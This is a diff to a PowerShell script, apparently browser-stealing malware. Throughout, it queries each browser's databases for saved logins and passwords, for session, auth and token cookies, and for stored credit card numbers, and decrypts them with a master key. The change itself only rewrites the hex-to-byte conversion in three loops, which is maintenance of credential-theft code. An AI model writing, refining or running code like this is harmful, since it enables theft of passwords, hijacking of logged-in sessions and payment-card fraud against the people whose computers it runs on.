@@ -157,7 +157,7 @@ foreach($br in $browsers){
     if(Test-Path $ldb){
       $rows=Read-Sqlite $ldb "SELECT origin_url,username_value,hex(password_value) AS pv FROM logins WHERE username_value!=''"
       foreach($r in $rows){
-        $raw=[byte[]]($r.pv-replace'..','0x$0,'-split','|?{$_}|%{[Convert]::ToByte($_,16)})
+        $raw=@(); for($i=0;$i -lt $r.pv.Length;$i+=2){$raw+=[byte]([Convert]::ToByte($r.pv.Substring($i,2),16))}
         $passwords+=[PSCustomObject]@{browser=$br.n;url=$r.origin_url;user=$r.username_value;pass=Unprotect-Value $raw $mk}
       }
     }
@@ -166,7 +166,7 @@ foreach($br in $browsers){
     if(Test-Path $cdb){
       $rows=Read-Sqlite $cdb "SELECT host_key,name,hex(encrypted_value) AS ev FROM cookies WHERE (name LIKE '%session%' OR name LIKE '%auth%' OR name LIKE '%token%' OR name LIKE '%sid%') LIMIT 400"
       foreach($r in $rows){
-        $raw=[byte[]]($r.ev-replace'..','0x$0,'-split','|?{$_}|%{[Convert]::ToByte($_,16)})
+        $raw=@(); for($i=0;$i -lt $r.ev.Length;$i+=2){$raw+=[byte]([Convert]::ToByte($r.ev.Substring($i,2),16))}
         $cookies+=[PSCustomObject]@{browser=$br.n;host=$r.host_key;name=$r.name;value=Unprotect-Value $raw $mk}
       }
     }
@@ -182,7 +182,7 @@ foreach($br in $browsers){
       try{
         $rows=Read-Sqlite $wdb "SELECT name_on_card,expiration_month,expiration_year,hex(card_number_encrypted) AS cn FROM credit_cards"
         foreach($r in $rows){
-          $raw=[byte[]]($r.cn-replace'..','0x$0,'-split','|?{$_}|%{[Convert]::ToByte($_,16)})
+          $raw=@(); for($i=0;$i -lt $r.cn.Length;$i+=2){$raw+=[byte]([Convert]::ToByte($r.cn.Substring($i,2),16))}
           $cards+=[PSCustomObject]@{type='card';browser=$br.n;name=$r.name_on_card;exp="$($r.expiration_month)/$($r.expiration_year)";number=Unprotect-Value $raw $mk}
         }
       }catch{}
